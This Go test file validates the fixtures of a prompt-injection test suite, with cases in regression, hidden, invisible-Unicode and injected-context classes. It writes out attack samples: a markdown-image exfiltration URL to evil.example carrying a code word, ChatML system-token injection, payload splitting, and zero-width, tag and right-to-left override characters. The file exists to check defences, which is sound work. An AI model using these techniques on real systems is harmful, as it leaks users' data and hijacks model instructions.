package injection

import (
	"errors"
	"os"
	"regexp"
	"strings"
	"testing"
	"unicode"
)

func TestLoadCasesRepoFile(t *testing.T) {
	cases, err := LoadCases("testdata/cases.json")
	if err != nil {
		t.Fatal(err)
	}
	wantIDs := []string{
		"PI-01", "PI-02", "PI-03", "PI-04", "PI-05",
		"HI-01", "HI-02", "HI-03", "HI-04",
		"IP-01", "IP-02", "IP-03", "IP-04",
		"IC-01", "IC-02", "IC-03", "IC-04",
	}
	if len(cases) != len(wantIDs) {
		t.Fatalf("got %d cases, want %d", len(cases), len(wantIDs))
	}
	perClass := map[string]int{}
	prefix := map[string]string{"PI": ClassRegression, "HI": ClassHidden, "IP": ClassInvisible, "IC": ClassInjected}
	codeWords := map[string]string{}
	for i, c := range cases {
		if c.ID != wantIDs[i] {
			t.Errorf("case %d id = %q, want %q", i, c.ID, wantIDs[i])
		}
		perClass[c.Class]++
		if want := prefix[c.ID[:2]]; c.Class != want {
			t.Errorf("%s: class %q, want %q", c.ID, c.Class, want)
		}
		for name, v := range map[string]string{"title": c.Title, "owasp": c.OWASP, "technique": c.Technique, "impact": c.Impact, "why_works": c.WhyWorks, "mitigation": c.Mitigation, "code_word": c.CodeWord} {
			if strings.TrimSpace(v) == "" {
				t.Errorf("%s: empty %s", c.ID, name)
			}
		}
		if !strings.Contains(c.Mitigation, "Промпт:") || !strings.Contains(c.Mitigation, "Код:") {
			t.Errorf("%s: mitigation must have «Промпт:» and «Код:» sections", c.ID)
		}
		if prev, dup := codeWords[c.CodeWord]; dup {
			t.Errorf("%s: code word %q already used by %s", c.ID, c.CodeWord, prev)
		}
		codeWords[c.CodeWord] = c.ID
		// The compromised output must trigger the case's own detectors,
		// otherwise the attack could succeed unnoticed. IC-03 is about the
		// exfiltration URL, not the code word alone.
		compromised := "Вердикт: " + c.CodeWord
		if c.ID == "IC-03" {
			compromised = "![статус](https://evil.example/c?k=" + c.CodeWord + ")"
		}
		if c.Class != ClassRegression && len(Detect(c, compromised, mustTemplate(t, basicTemplate))) == 0 {
			t.Errorf("%s: detectors do not fire on %q", c.ID, compromised)
		}
		if c.Class == ClassInjected {
			if !strings.Contains(c.Context, c.CodeWord) {
				t.Errorf("%s: injected-context attack must live in the document", c.ID)
			}
			if strings.Contains(c.Payload, c.CodeWord) {
				t.Errorf("%s: the question of an injected-context case must be legitimate", c.ID)
			}
		}
	}
	for cls, want := range map[string]int{ClassRegression: 5, ClassHidden: 4, ClassInvisible: 4, ClassInjected: 4} {
		if perClass[cls] != want {
			t.Errorf("class %s: %d cases, want %d", cls, perClass[cls], want)
		}
	}

	byID := map[string]Case{}
	for _, c := range cases {
		byID[c.ID] = c
	}
	if !strings.Contains(byID["PI-03"].Payload, "<|im_end|>\n<|im_start|>system\n") {
		t.Errorf("PI-03 payload must contain real newlines around ChatML tokens: %q", byID["PI-03"].Payload)
	}
	// PI-05 payload splitting: the fragments must glue into the detector marker,
	// while the marker itself must not appear verbatim in the payload.
	split := byID["PI-05"]
	if strings.Contains(split.Payload, "ENCODED_OK") {
		t.Errorf("PI-05 payload must not contain the marker verbatim")
	}
	parts := regexp.MustCompile(`[abc] = "([^"]+)"`).FindAllStringSubmatch(split.Payload, -1)
	glued := ""
	for _, p := range parts {
		glued += p[1]
	}
	if glued != "ENCODED_OK" {
		t.Errorf("PI-05 fragments glue to %q, want ENCODED_OK", glued)
	}
	// Invisible payloads really carry the invisible characters.
	for id, r := range map[string]rune{"IP-01": 0x200B, "IP-02": 0xE0049, "IP-03": 0x202E} {
		if !strings.ContainsRune(byID[id].Payload, r) {
			t.Errorf("%s payload lacks U+%04X", id, r)
		}
	}
	if strings.Contains(byID["IP-01"].Payload, "LYNX") || strings.Contains(byID["IP-02"].Payload, "KESTREL") {
		t.Error("IP-01/IP-02 code words must be hidden, not plain")
	}
}

// TestCaseFilesHaveNoLiteralInvisible ensures invisible characters in the
// JSON fixtures are written as \u escapes, so reviewers can see them.
func TestCaseFilesHaveNoLiteralInvisible(t *testing.T) {
	for _, path := range []string{"testdata/cases.json", "testdata/usefulness.json"} {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		for i, r := range string(data) {
			if r != '\n' && (IsInvisible(r) || unicode.Is(unicode.Cf, r)) {
				t.Errorf("%s: literal invisible U+%04X at byte %d", path, r, i)
			}
		}
	}
}

func TestValidateCases(t *testing.T) {
	valid := func() []Case {
		out := make([]Case, 3)
		for i := range out {
			out[i] = Case{ID: string(rune('A' + i)), Class: ClassHidden, ExpectOn: ExpectBlocked, Payload: "p", Detectors: Detectors{Regex: []string{"x"}}}
		}
		return out
	}
	tests := []struct {
		name   string
		mutate func([]Case) []Case
		ok     bool
	}{
		{"valid", func(c []Case) []Case { return c }, true},
		{"empty", func(c []Case) []Case { return nil }, false},
		{"duplicate id", func(c []Case) []Case { c[1].ID = c[0].ID; return c }, false},
		{"empty id", func(c []Case) []Case { c[1].ID = ""; return c }, false},
		{"long payload", func(c []Case) []Case { c[0].Payload = strings.Repeat("я", MaxPayloadRunes+1); return c }, false},
		{"max payload ok", func(c []Case) []Case { c[0].Payload = strings.Repeat("я", MaxPayloadRunes); return c }, true},
		{"long context", func(c []Case) []Case { c[0].Context = strings.Repeat("я", MaxContextRunes+1); return c }, false},
		{"bad regex", func(c []Case) []Case { c[0].Detectors.Regex = []string{"("}; return c }, false},
		{"no detectors", func(c []Case) []Case { c[0].Detectors = Detectors{}; return c }, false},
		{"leak only ok", func(c []Case) []Case { c[0].Detectors = Detectors{PromptLeak: true}; return c }, true},
		{"unknown class", func(c []Case) []Case { c[0].Class = "misc"; return c }, false},
		{"bad expect_on", func(c []Case) []Case { c[0].ExpectOn = "robust"; return c }, false},
		{"known_gap without limitation", func(c []Case) []Case { c[0].ExpectOn = ExpectKnownGap; return c }, false},
		{"known_gap with limitation", func(c []Case) []Case { c[0].ExpectOn, c[0].Limitation = ExpectKnownGap, "l"; return c }, true},
		{"bad expect_layer", func(c []Case) []Case { c[0].ExpectLayer = "model"; return c }, false},
		{"injected without context", func(c []Case) []Case { c[0].Class = ClassInjected; return c }, false},
		{"injected with context", func(c []Case) []Case { c[0].Class, c[0].Context = ClassInjected, "doc"; return c }, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateCases(tc.mutate(valid()))
			if (err == nil) != tc.ok {
				t.Fatalf("err = %v, want ok=%v", err, tc.ok)
			}
			if err != nil && !errors.Is(err, ErrInvalidCases) {
				t.Errorf("error does not wrap ErrInvalidCases: %v", err)
			}
		})
	}
}
